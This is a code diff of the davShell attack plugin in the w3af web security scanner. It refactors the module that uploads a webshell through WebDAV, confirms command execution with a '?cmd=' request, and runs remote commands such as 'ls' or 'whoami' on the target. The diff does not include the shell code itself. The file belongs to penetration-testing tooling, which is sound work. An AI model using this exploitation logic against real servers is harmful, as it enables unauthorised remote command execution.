@@ -30,12 +30,12 @@ from core.controllers.basePlugin.baseAttackPlugin import baseAttackPlugin
 
 import core.data.kb.knowledgeBase as kb
 import core.data.kb.vuln as vuln
-from core.data.kb.shell import shell as shell
+from core.data.kb.exec_shell import exec_shell as exec_shell
 
 import core.data.parsers.urlParser as urlParser
 from core.controllers.w3afException import w3afException
 
-import plugins.attack.payloads.payloads as payloads
+import plugins.attack.payloads.shell_handler as shell_handler
 import urllib
 
 
@@ -63,6 +63,7 @@ class davShell(baseAttackPlugin):
             om.out.error('You have to configure the "url" parameter.')
         else:
             v = vuln.vuln()
+            v.setPluginName(self.getName())
             v.setURL( self._url )
             kb.kb.append( 'dav', 'dav', v )
     
@@ -110,7 +111,7 @@ class davShell(baseAttackPlugin):
         extension = urlParser.getExtension( vuln_obj.getURL() )
         
         # I get a list of tuples with file_content and extension to use
-        shell_list = payloads.get_webshells( extension )
+        shell_list = shell_handler.get_webshells( extension )
         
         for file_content, real_extension in shell_list:
             if extension == '':
@@ -125,11 +126,11 @@ class davShell(baseAttackPlugin):
             # Verify if I can execute commands
             # All w3af shells, when invoked with a blank command, return a 
             # specific value in the response:
-            # payloads.SHELL_IDENTIFIER
+            # shell_handler.SHELL_IDENTIFIER
             response = self._urlOpener.GET( url_to_upload + '?cmd=' )
-            if payloads.SHELL_IDENTIFIER in response.getBody():
+            if shell_handler.SHELL_IDENTIFIER in response.getBody():
                 msg = 'The uploaded shell returned the SHELL_IDENTIFIER: "'
-                msg += payloads.SHELL_IDENTIFIER + '".'
+                msg += shell_handler.SHELL_IDENTIFIER + '".'
                 om.out.debug( msg )
                 self._exploit_url = url_to_upload + '?cmd='
                 return True
@@ -194,19 +195,19 @@ class davShell(baseAttackPlugin):
             - URL (only used in fastExploit)
         '''
         
-class davShellObj(shell):
+class davShellObj(exec_shell):
     def setExploitURL( self, eu ):
         self._exploit_url = eu
     
     def getExploitURL( self ):
         return self._exploit_url
         
-    def _rexec( self, command ):
+    def execute( self, command ):
         '''
-        This method is called when a command is being sent to the remote server.
-        This is a NON-interactive shell.
+        This method executes a command in the remote operating system by
+        exploiting the vulnerability.
 
-        @parameter command: The command to send ( ie. "ls", "whoami", etc ).
+        @parameter command: The command to handle ( ie. "ls", "whoami", etc ).
         @return: The result of the command.
         '''
         to_send = self.getExploitURL() + urllib.quote_plus( command )
